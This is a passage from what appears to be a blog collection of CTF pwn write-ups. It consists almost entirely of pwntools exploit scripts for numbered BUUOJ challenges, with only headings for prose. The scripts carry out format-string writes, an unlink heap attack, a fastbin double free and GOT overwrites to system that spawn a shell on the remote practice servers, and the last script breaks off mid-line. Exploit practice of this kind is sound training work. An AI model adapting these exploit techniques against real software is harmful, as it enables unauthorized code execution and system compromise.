class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./mrctf2020_easy_equation&#x27;</span>)<span class="comment">#,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26839</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;mrctf2020_easy_equation&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">o_g = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.sh(),arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class="line"></span><br><span class="line">judge = <span class="number">2</span></span><br><span class="line">judge_addr = <span class="number">0x000000000060105C</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;aa&quot;</span> + <span class="string">&quot;%9$nbbb&quot;</span> + p64(judge_addr)</span><br><span class="line">gdb.attach(p, <span class="string">&#x27;b *0x0000000000400649&#x27;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-89-hitcontraining-unlink-solve"><a href="#NO-89-hitcontraining-unlink-solve" class="headerlink" title="NO.89 hitcontraining_unlink_solve"></a>NO.89 hitcontraining_unlink_solve</h1><h3 id="exp-89"><a href="#exp-89" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./hitcontraining_unlink&#x27;</span>)<span class="comment">#,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26063</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;hitcontraining_unlink&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">o_g = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line">shellcode = asm(shellcraft.sh(),arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">sla(<span class="string">&#x27;Your choice:&#x27;</span> ,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content</span>):</span></span><br><span class="line">sla(<span class="string">&#x27;Your choice:&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;name:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">sla(<span class="string">&#x27;item:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, size, content</span>):</span></span><br><span class="line">sla(<span class="string">&#x27;Your choice:&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;item:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">sla(<span class="string">&#x27;name:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">sla(<span class="string">&#x27;item:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">sla(<span class="string">&#x27;Your choice:&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;item:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">itemlist = <span class="number">0x00000000006020C0</span></span><br><span class="line">magic = <span class="number">0x0000000000400D49</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">&#x27;aa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">&#x27;bb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">&#x27;cc&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">&#x27;dd&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>)</span><br><span class="line">payload += p64(itemlist) + p64(itemlist+<span class="number">0x8</span>)</span><br><span class="line">payload += p64(<span class="number">0x20</span>)*<span class="number">2</span> </span><br><span class="line">payload += p64(<span class="number">0x30</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0x80</span>) + p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line">edit(<span class="number">1</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">atoi_addr = l64()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(atoi_addr), atoi_addr)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;atoi&#x27;</span>, atoi_addr)</span><br><span class="line">libcbase = atoi_addr - libc.dump(<span class="string">&#x27;atoi&#x27;</span>)</span><br><span class="line">system = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libcbase = puts_addr - libc.sym[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="comment"># system = libcbase + libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="comment"># binsh = libcbase + libc.search(&#x27;/bin/sh&#x27;).next()</span></span><br><span class="line"></span><br><span class="line">lg(<span class="string">&#x27;atoi_addr&#x27;</span>, atoi_addr)</span><br><span class="line">lg(<span class="string">&#x27;system&#x27;</span>, system)</span><br><span class="line">lg(<span class="string">&#x27;binsh&#x27;</span>, binsh)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x8</span>, p64(system))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-90-gyctf-2020-some-thing-exceting-solve"><a href="#NO-90-gyctf-2020-some-thing-exceting-solve" class="headerlink" title="NO.90 gyctf_2020_some_thing_exceting_solve"></a>NO.90 gyctf_2020_some_thing_exceting_solve</h1><h3 id="exp-90"><a href="#exp-90" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./gyctf_2020_some_thing_exceting&#x27;</span>)<span class="comment">#,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25471</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;gyctf_2020_some_thing_exceting&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">o_g = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line">shellcode = asm(shellcraft.sh(),arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size1, content1, size2, content2</span>):</span></span><br><span class="line">sla(<span class="string">&#x27; :&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;length :&#x27;</span>, <span class="built_in">str</span>(size1))</span><br><span class="line">sla(<span class="string">&#x27; :&#x27;</span>, content1)</span><br><span class="line">sla(<span class="string">&#x27;length :&#x27;</span>, <span class="built_in">str</span>(size2))</span><br><span class="line">sla(<span class="string">&#x27; :&#x27;</span>, content2)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">sla(<span class="string">&#x27; :&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27; :&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">sla(<span class="string">&#x27; :&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27; :&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">flag_chunk = <span class="number">0x0000000000602098</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x50</span>, <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">0x50</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x50</span>, <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0x50</span>, p64(flag_chunk), <span class="number">0x50</span>, <span class="string">&#x27;cccc&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0x50</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x50</span>, <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">0x50</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x20</span>, <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-91-axb-2019-fmt64-solve"><a href="#NO-91-axb-2019-fmt64-solve" class="headerlink" title="NO.91 axb_2019_fmt64_solve"></a>NO.91 axb_2019_fmt64_solve</h1><h3 id="exp-91"><a href="#exp-91" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./axb_2019_fmt64&#x27;</span>)<span class="comment">#,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26076</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;axb_2019_fmt64&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">o_g = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.sh(),arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class="line">offset = <span class="number">0x268</span>//<span class="number">8</span> + <span class="number">1</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">strlen_got = elf.got[<span class="string">&#x27;strlen&#x27;</span>]</span><br><span class="line">payload = <span class="string">&quot;%9$s&quot;</span> + <span class="string">&quot;aaaa&quot;</span> + p64(read_got)</span><br><span class="line"><span class="comment"># payload = p64(puts_got)+ &#x27;\x00&#x27;*4 +&quot;%8$s&quot;</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">sla(<span class="string">&#x27;Please tell me:&#x27;</span>, payload)</span><br><span class="line">read_addr = l64()</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>, read_addr)</span><br><span class="line">libcbase = read_addr - libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">system = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libcbase = read_addr - libc.sym[&#x27;read&#x27;]</span></span><br><span class="line"><span class="comment"># system = libcbase + libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="comment"># binsh = libcbase + libc.search(&#x27;/bin/sh&#x27;).next()</span></span><br><span class="line"><span class="comment"># strlen = libcbase + libc.sym[&#x27;strlen&#x27;]</span></span><br><span class="line">lg(<span class="string">&#x27;read_addr&#x27;</span>, read_addr)</span><br><span class="line">lg(<span class="string">&#x27;system&#x27;</span>, system)</span><br><span class="line">lg(<span class="string">&#x27;binsh&#x27;</span>, binsh)</span><br><span class="line"><span class="comment"># lg(&#x27;strlen&#x27;, strlen)</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">high_sys = (system &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span></span><br><span class="line">low_sys  = system &amp; <span class="number">0xffff</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(high_sys), <span class="built_in">hex</span>(low_sys-high_sys))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(high_sys - <span class="number">9</span>) + <span class="string">&quot;c%12$hhn&quot;</span> </span><br><span class="line">payload+= <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(low_sys - high_sys) + <span class="string">&quot;c%13$hn&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">32</span>,<span class="string">&quot;A&quot;</span>) + p64(strlen_got + <span class="number">2</span>) + p64(strlen_got)</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = fmtstr_payload(7, &#123;strlen_got : system&#125;)</span></span><br><span class="line">sa(<span class="string">&#x27;Please tell me:&#x27;</span>, payload)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">sa(<span class="string">&#x27;Please tell me:&#x27;</span>, <span class="string">&quot;;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-92-wdb-2018-2nd-easyfmt-solve"><a href="#NO-92-wdb-2018-2nd-easyfmt-solve" class="headerlink" title="NO.92 wdb_2018_2nd_easyfmt_solve"></a>NO.92 wdb_2018_2nd_easyfmt_solve</h1><h3 id="exp-92"><a href="#exp-92" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./wdb_2018_2nd_easyfmt&#x27;</span>)<span class="comment">#,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29910</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;wdb_2018_2nd_easyfmt&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc/ubuntu16/32/libc-2.23.so&#x27;</span>)</span><br><span class="line">o_g = [<span 